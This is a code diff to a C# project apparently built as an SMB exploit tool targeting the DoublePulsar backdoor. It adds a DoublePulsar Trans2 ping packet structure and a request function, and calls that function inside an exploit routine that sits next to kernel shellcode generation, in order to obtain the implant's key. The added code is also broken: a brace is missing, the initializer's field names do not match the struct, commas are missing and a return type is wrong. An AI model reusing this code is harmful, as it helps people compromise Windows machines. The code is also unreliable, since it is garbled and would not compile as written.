@@ -91,6 +91,32 @@ namespace DoublePulsar
             //Dialects are added manually
         }
 
+	    
+	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
+        public struct DOUBLEPULSAR_PING
+        {
+            public byte WordCount;
+            public ushort TotalParameterCount;
+            public ushort TotalDataCount;
+            public ushort MaxParameterCount;
+            public ushort MaxDataCount;
+	    public byte MaxSetupCount;
+	    public byte Reserved;
+	    public ushort Flags;
+	    public uint Timeout;
+	    public ushort Reserved2;
+	    public ushort ParamterCount;
+	    public ushort ParameterOffset;
+	    public ushort DataCount;
+	    public ushort DataOffset;
+	    public byte setupcount;
+	    public byte reserved3;
+	    public ushort subcommand;
+            public ushort ByteCount;
+            public byte padding;
+	    //Parameters added manually
+        }
+	    
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
         public struct SMB_COM_TRANSACTION2_SECONDARY_REQUEST
         {
@@ -289,6 +315,65 @@ static public byte[] MakeTrans2Packet(ushort TID, ushort UID, int time, byte[] p
             SendSMBMessage(sock, pkt, true);
             return ReceiveSMBMessage(sock);
         }
+	
+	static public byte[] DoublepulsarPingRequest(Socket sock, ushort UID, ushort TID)
+SMB_HEADER header = new SMB_HEADER
+            {
+                protocol = 0x424d53ff,
+                command = 0x32,
+                errorClass = 0x00,
+                _reserved = 0x00,
+                errorCode = 0x0000,
+                flags = 0x18,
+                flags2 = 0xc007,
+                PIDHigh = 0x0000,
+                SecurityFeatures = 0x0000000000000000,
+                reserved = 0x0000,
+                TID = TID, /*0xfeff*/
+                PIDLow = 0x4b2f,
+                UID = UID,
+                MID = 0x0042
+            };
+            byte[] headerBytes = GetBytes(header);
+
+	DOUBLEPULSAR_PING ping = new DOUBLEPULSAR_PING
+            {
+		wordCount = 15, 
+		totalParameterCount = 0x0C,
+		totalDataCount = 0x0000,
+
+		MaxParameterCount = 0x0100,
+		MaxDataCount = 0x0000,
+		MaxSetupCount = 0x00,
+		reserved1 = 0x00,
+		flags1 = 0x0000,
+
+		//timeout = SWAP_WORD(0x0134ee00),
+		timeout = 0x00ee3401,
+
+		reserved2 = 0x0000
+		ParameterCount = 0x0C
+		ParamOffset= 0x0042
+		DataCount = 0x0000),
+		DataOffset = 0x004e,
+		SetupCount = 1,
+		reserved3 = 0x00,
+		subcommand = 0x000e,
+		ByteCount = 0xD,
+		padding = 0x00,
+		signature = 0x00000000
+            };
+
+	List<byte> Parameters = new List<byte>();
+        Parameters.AddRange(Enumerable.Repeat((byte)0x00, 12));
+	
+	byte[] DoublepulsarPINGPKT = GetBytes(ping).Concat(Parameters.ToArray()).ToArray();
+        byte[] pkt = headerBytes.Concat(DoublepulsarPINGPKT).ToArray();
+
+	SendSMBMessage(sock, pkt, true);
+        return ReceiveSMBMessage(sock);
+}
+	
 
 static public byte[] MakeKernelShellcode()
         {
@@ -550,9 +635,9 @@ static public byte[] MakeKernelShellcode()
             
             //we need to obtain the key for DoublePulsar
             //Send DoublePulsar trans2 ping packet here
-            
-            
-            //Receive Trans2 DoublePulsar Response & Parse
+            char[] pingrequestresponse = DoublepulsarPingRequest(sock, header.UID, header.TID);
+	    //Receive Trans2 DoublePulsar Response & Parse
+            header = SMB_HeaderFromBytes(pingrequestresponse);
             
             //https://github.com/HynekPetrak/doublepulsar-detection-csharp/blob/master/DoublepulsarDetectionLib/DetectDoublePulsar.cs
             byte[] final_response = buf;
